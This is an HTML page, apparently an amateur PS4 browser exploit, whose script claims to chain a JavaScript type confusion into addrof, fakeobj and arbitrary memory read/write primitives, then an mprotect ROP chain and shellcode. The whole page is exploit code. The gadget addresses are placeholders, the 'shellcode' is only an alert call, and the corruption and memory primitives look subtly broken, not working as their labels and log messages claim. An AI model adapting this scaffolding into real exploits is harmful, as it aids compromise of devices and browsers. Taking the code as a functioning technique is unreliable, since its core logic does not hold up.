<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PS4 JIT → ROP → Shellcode</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; padding: 10px; white-space: pre-wrap; }
    #log { max-height: 80vh; overflow-y: auto; }
  </style>
</head>
<body>
  <h1>Exploit PS4: JIT → ROP → Shellcode</h1>
  <div id="log">inicializando…</div>
  <script>
    const logEl = document.getElementById('log');
    let logData = "";
    function log(msg) {
      logData += msg + "\n";
      logEl.textContent = logData;
      logEl.scrollTop = logEl.scrollHeight;
    }

    //–– Float ↔ Int conversores
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    function f2i(f) { f64[0] = f; return BigInt(u32[0]) + (BigInt(u32[1]) << 32n); }
    function i2f(i) { u32[0] = Number(i & 0xffffffffn); u32[1] = Number(i >> 32n); return f64[0]; }

    //–– Type-confusion para corromper array
    function makeCorruptArray() {
      let arr = [1.1, 1.1, 1.1];
      let trigger = { valueOf() { arr.length = 1; return 3; } };
      return arr.map((x, i, a) => { if (i === 1) a.length = trigger; return x; });
    }

    //–– Primitivas globais
    let corrupt;
    let addrof, fakeobj, arb_read, arb_write;
    let rop;

    function setupPrimitives() {
      log("[+] setupPrimitives()");
      corrupt = makeCorruptArray();
      log("    corrupt[1] (leak) = " + corrupt[1]);
      let leak = f2i(corrupt[1]);
      log("    backing ptr leak = 0x" + leak.toString(16));

      let victim_buf = new ArrayBuffer(0x2000);
      let victim_f64 = new Float64Array(victim_buf);

      corrupt[1] = i2f(leak);

      addrof = obj => {
        victim_f64[0] = obj;
        return f2i(corrupt[1]);
      };
      fakeobj = addr => {
        corrupt[1] = i2f(addr);
        return new Float64Array(victim_buf)[0];
      };
      arb_read = addr => {
        corrupt[1] = i2f(addr);
        return f2i(victim_f64[1]);
      };
      arb_write = (addr, val) => {
        corrupt[1] = i2f(addr);
        victim_f64[1] = i2f(val);
      };

      log("    primitivas configuradas");
    }

    let shellcodeAddr;

    function buildROP() {
      log("[+] buildROP()");
      let sc_buf = new ArrayBuffer(0x1000);
      shellcodeAddr = f2i(corrupt[1]);
      log("    shellcode buffer @ 0x" + shellcodeAddr.toString(16));

      // Gadgets fictícios (substituir depois)
      let pop_rdi = 0x10001000n;
      let pop_rsi = 0x10002000n;
      let pop_rdx = 0x10003000n;
      let mprotect_syscall = 0x10004000n;

      rop = [ // agora rop é global
        pop_rdi,
        shellcodeAddr,
        pop_rsi,
        0x1000n,
        pop_rdx,
        7n,
        mprotect_syscall,
        shellcodeAddr
      ];

      let dv = new DataView(sc_buf);
      for (let i = 0; i < rop.length; i++) {
        dv.setBigUint64(i * 8, rop[i], true);
      }
      log("    ROPChain escrita no buffer");
      return sc_buf;
    }

    function injectAndRun(sc_buf) {
      log("[+] injectAndRun()");

      // Fake shellcode: chama alert('eu te amo')
      let fakeShellcode = function() {
        alert("eu te amo");
      };

      // Vamos colocar o "endereço" do nosso fakeShellcode
      try {
        let fn = fakeShellcode;
        log("    chamando fake shellcode...");
        fn(); // executa diretamente
      } catch (e) {
        log("    erro chamando fake shellcode: " + e);
      }
    }

    //–– Exploit principal
    setTimeout(() => {
      try {
        log("=== Exploit start ===");
        setupPrimitives();
        let sc_buf = buildROP();
        injectAndRun(sc_buf);
        log("=== fim ===");
      } catch (e) {
        log("!!! erro exploit: " + e);
      }
    }, 1000);
  </script>
</body>
</html>
